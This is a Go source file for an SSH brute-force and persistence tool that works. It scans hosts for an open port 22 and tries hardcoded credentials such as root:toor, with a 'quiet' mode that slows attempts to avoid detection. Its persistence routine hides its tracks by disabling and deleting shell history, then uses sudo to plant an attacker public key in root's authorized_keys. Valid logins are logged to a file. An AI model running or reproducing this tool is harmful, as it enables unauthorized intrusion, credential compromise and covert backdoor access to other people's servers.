package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// Constants:
var (
	privateKeyPath  string
	publicKeyPath   string
	persistance     bool
	privateKeyAuth  bool
	attackType      int
	hostsFilePath   string
	resultsFilePath string
	passwords_list  = []string{"Aa123456!", "toor", "kali"}
	usernames_list  = []string{"root", "testuser"}
	credentialsDict = map[string]string{
		"testuser": "Aa123456",
		"root":     "toor",
	}
	ipListMutex             sync.Mutex
	wg1                     sync.WaitGroup
	wg2                     sync.WaitGroup
	results_list            []result
	persistanceSuccessArray []string
	privateAuthSuccessArray []string
	ip_channel              = make(chan string)
	errChan                 = make(chan error)
	credsChannel            = make(chan result)
)

type result struct {
	ip            string
	credentials   []string
	isPrivateKey  bool
	isPersistance bool
}

func getArguments() {
	flag.StringVar(&hostsFilePath, "hostsfile", "", "path to linux servers file")
	flag.IntVar(&attackType, "type", 0, "Type of ssh brute force (1 for noisy, 2 for quite)")
	flag.BoolVar(&privateKeyAuth, "k", false, "Try to log in using private key that you provide")
	flag.BoolVar(&persistance, "p", false, "Install public key on servers that we logged in to")
	flag.StringVar(&publicKeyPath, "publickey", "", "Path to public key file (for persistancy option)")
	flag.StringVar(&privateKeyPath, "privatekey", "", "Path to private key file")
	flag.StringVar(&resultsFilePath, "r", "", "Path to private key file")

	// Deals with unrecognized arguments
	flag.Usage = func() {
		fmt.Println(`Usage of theForce.exe: -type (1 or 2) -hostsfile <path to hostsfile> [flags]
		Example: theForce.exe -type 2 -hostsfile c:\\temp\\linux_servers.txt -p -pubickey c:\\temp\\id_rsa.pub
		If not specified: private key, brute force and persistance will be turned off (the user didnt choose -k or -p)`)
		flag.PrintDefaults()
	}
	// Parse flags
	flag.Parse()

	// Check if required flags are provided
	if attackType != 1 && attackType != 2 {
		panic("-type can only be 1 or 2")
	}
	if hostsFilePath == "" {
		panic("-hostsfile argument is mandatory")
	}
	if privateKeyAuth && privateKeyPath == "" {
		panic("Please specify a private key for authentication (or delete the '-k' option)")
	}
	if persistance && publicKeyPath == "" {
		panic("Please specify a public key to install on the server (or delete the '-p' option)")
	}
	if resultsFilePath == "" {
		panic("Please specify a result file path (-r <path>)")
	}
}

func isIPAlreadyInSlice(ip string, stringSlice []string) bool {
	ipListMutex.Lock()
	defer ipListMutex.Unlock()
	for _, connectedIP := range stringSlice {
		if connectedIP == ip {
			return true
		}
	}
	return false
}

func markIPAsSuccessfulPrivate(ip string) {
	ipListMutex.Lock()
	defer ipListMutex.Unlock()
	for _, connectedIP := range privateAuthSuccessArray {
		if connectedIP == ip {
			return
		}
	}
	privateAuthSuccessArray = append(privateAuthSuccessArray, ip)
}

func markIPAsSuccessfulPersistance(ip string) {
	ipListMutex.Lock()
	defer ipListMutex.Unlock()
	for _, connectedIP := range persistanceSuccessArray {
		if connectedIP == ip {
			return
		}
	}
	persistanceSuccessArray = append(persistanceSuccessArray, ip)
}

func getPublicKeyContent() string {
	content, err := os.ReadFile(publicKeyPath)
	if err != nil {

		fmt.Print(err)
	}
	// convert the content (bytes) into a string
	return string(content)
}

func getHostnamesList() ([]string, error) {
	file_handle, err := os.Open(hostsFilePath)

	// Open file Error
	if err != nil {
		return nil, err
	}
	fileScanner := bufio.NewScanner(file_handle)
	fileScanner.Split(bufio.ScanLines)

	var ip_list []string

	for fileScanner.Scan() {
		ip_list = append(ip_list, fileScanner.Text())
	}
	file_handle.Close()
	return ip_list, nil
}

func listenErrorChannel() {
	for err := range errChan {
		fmt.Printf("[-] Error: %s\n", err)
	}
}

func listenIpChannel() {
	for ip := range ip_channel {
		fmt.Printf("[+] The %s is open to ssh connection\n", ip)
		for _, username := range usernames_list {
			for _, password := range passwords_list {
				wg2.Add(1)
				// time.Sleep(800 * time.Millisecond)
				go sshConnect(username, password, ip)
			}
		}
	}
	//wait for all sshConnect to finish
	wg2.Wait()
}

func listenIpChannelQuite() {
	for ip := range ip_channel {
		fmt.Printf("[+] The %s is open to ssh connection\n", ip)
		for username, password := range credentialsDict {
			wg2.Add(1)
			go sshConnect(username, password, ip)
		}
	}
	wg2.Wait()
}

func is_port_open(ip string) {
	defer wg1.Done()
	// Sleep between ssh packets in quite mode
	dialer := net.Dialer{Timeout: 800 * time.Millisecond}
	_, err := dialer.Dial("tcp", ip+":22")
	if err != nil {
		errChan <- err
	} else {
		ip_channel <- ip
	}
	if attackType == 2 {
		time.Sleep(3 * time.Second)
	}
}

func writeResults(ip string, creds []string, file_handle *os.File, privKeySuccess, persistantSuccess bool) {
	writer := bufio.NewWriter(file_handle)
	defer writer.Flush()
	newLine := ip + "\t"
	if ip != "" && creds != nil {
		// newLine += username + ":" + password + "\t"
		for _, cred := range creds {
			newLine += cred + "\t"
		}
	}
	if privKeySuccess {
		newLine += "Private key is valid for root\t"
	}
	if persistantSuccess {
		newLine += "Public key installed"
	}
	_, err := writer.WriteString(newLine + "\n")
	if err != nil {
		fmt.Println("[-] Error writing to file:", err)
	}
}

func sshConnect(username string, password string, ip string) {
	defer wg2.Done()
	var isPersistance, isPrivateKeyAuth bool

	// Configuration for authentication
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout:         5 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", ip+":22", config)
	if err != nil {
		fmt.Printf("[-] Couldnt connect using %s:%s to server %s\n", username, password, ip)

		// private key option is on -> try to log in even if credentials are incorrect
		if privateKeyAuth && !isIPAlreadyInSlice(ip, privateAuthSuccessArray) {
			isPrivateKeyAuth, client = connectWithPrivateKey(ip)
		}
		// Connected with private key -> do persistance
		if isPrivateKeyAuth {
			// Persistance flag is on and we didnt succsessfully put public key on this server already
			if persistance && !isIPAlreadyInSlice(ip, persistanceSuccessArray) {
				isPersistance = persistanceScript(client, ip, password)
				fmt.Println(persistanceSuccessArray)
			}
			// write results
			credsChannel <- result{ip, nil, isPrivateKeyAuth, isPersistance}
		}
	} else {
		fmt.Printf("[+] %s:%s valid credentials to %s\n", username, password, ip)

		// private key option is on
		if privateKeyAuth && !isIPAlreadyInSlice(ip, privateAuthSuccessArray) {
			var privateKeyClient *ssh.Client
			isPrivateKeyAuth, privateKeyClient = connectWithPrivateKey(ip)
			if privateKeyClient != nil {
				privateKeyClient.Close()
			}
		}
		time.Sleep(1 * time.Second)
		// Persistance flag is on and we didnt succsessfully put public key on this server
		if persistance && !isIPAlreadyInSlice(ip, persistanceSuccessArray) {
			isPersistance = persistanceScript(client, ip, password)
		}
		credsChannel <- result{ip, []string{username + ":" + password}, isPrivateKeyAuth, isPersistance}
	}
}

func connectWithPrivateKey(ip string) (bool, *ssh.Client) {

	publicKeyAuthMethod := getPublicKeyAuthMethod()
	if publicKeyAuthMethod != nil {
		// Configuration for authentication
		config := &ssh.ClientConfig{
			User: "root",
			Auth: []ssh.AuthMethod{
				publicKeyAuthMethod,
			},
			Timeout:         10 * time.Second,
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}
		// Quite attack -> wait between ssh.dial
		if attackType == 2 {
			time.Sleep(3 * time.Second)
		}
		// Preventing consecutive run of the private key auth script on the same ip
		markIPAsSuccessfulPrivate(ip)

		// Connect to SSH server using private key
		conn, err := ssh.Dial("tcp", ip+":22", config)
		if err != nil {
			fmt.Printf("[-] Couldnt connect to %s using private key\n", ip)
			return false, nil
		}
		// Persistance flag is off -> we no longer need the connection
		if !persistance {
			defer conn.Close()
		}
		fmt.Printf("[+] Connected to %s using private key\n", ip)
		return true, conn
	}
	return false, nil
}

func getPublicKeyAuthMethod() ssh.AuthMethod {
	key, err := os.ReadFile(privateKeyPath)
	if err != nil {
		errChan <- err
	}
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		errChan <- err
	}
	return ssh.PublicKeys(signer)
}

func persistanceScript(client *ssh.Client, ip, password string) bool {
	// Preventing consecutive run of the persistant script on the same ip

	if client == nil {
		fmt.Printf("[-] No valid SSH client for %s\n", ip)
		return false
	}
	session, err := client.NewSession()
	if err != nil {
		fmt.Printf("[-] Couldnt run commands on server %s\n", ip)
		return false
	} else {
		defer session.Close()
		publicKeyContent := getPublicKeyContent()

		// Remove trailing newline character if it exists
		publicKeyContent = strings.TrimRight(publicKeyContent, "\n")

		// Explaination (each command seperated with ";"):
		//	1. disable history
		//	2. delete the "disable history" command by taking the number of that command from history command and finaly
		//	3. add our public key to the "authorized key" file
		// 	4. enable history
		persistance_command := "set +o history;history -d $(history | awk '{print $1}' | tail -n 1);echo " + password + " | sudo -S sh -c 'mkdir /root/.ssh; echo " + publicKeyContent + " >> /root/.ssh/authorized_keys'"

		// Execute the command
		_, err := session.CombinedOutput(persistance_command)
		if err != nil {
			fmt.Println("[-] Failed to execute command:", err, ip)
			return false
		}
		markIPAsSuccessfulPersistance(ip)
		fmt.Println("Persistance executed successfully on: ", ip)
		return true
	}
}

func listenCredsChannel() {

	defer close(credsChannel) // Close the channel when all sending goroutines are done
	for result := range credsChannel {
		results_list = append(results_list, result)
	}

}
func remove_duplicates() {
	// After all the ssh brute force we have a slice that contains duplicate results for the same ip
	// we convert the slice to a map that includes all the data for a single ip in a single result object
	// after that we write the result to log file
	ipIndexMap := make(map[string]*result)

	// Process each result
	for i := range results_list {
		result := &results_list[i]
		singleResult, isInMap := ipIndexMap[result.ip]

		if isInMap {
			singleResult.credentials = append(singleResult.credentials, result.credentials...)
			singleResult.isPrivateKey = singleResult.isPrivateKey || result.isPrivateKey
			singleResult.isPersistance = singleResult.isPersistance || result.isPersistance
		} else {
			ipIndexMap[result.ip] = result
		}
	}
	results_file, err := os.OpenFile(resultsFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		errChan <- err
	}
	//Combine and print the data
	for _, data := range ipIndexMap {
		writeResults(data.ip, data.credentials, results_file, data.isPrivateKey, data.isPersistance)
	}
}
func main() {
	getArguments()
	ip_list, err := getHostnamesList()
	//Error reading hostname file
	if err != nil {
		panic(err)
	}
	// Set 2 go routines that will listen untill channels are closed
	go listenErrorChannel()
	go listenCredsChannel()

	// Get a list of ips with open port 22
	for _, ip := range ip_list {
		wg1.Add(1)
		// check if ssh is open
		go is_port_open(ip)
	}
	// "Loud" ssh brute force
	if attackType == 1 {
		go listenIpChannel()
		// "Quite" ssh brute force
	} else {
		go listenIpChannelQuite()
	}
	wg1.Wait()
	wg2.Wait()
	close(ip_channel)
	close(errChan)
	remove_duplicates()
}
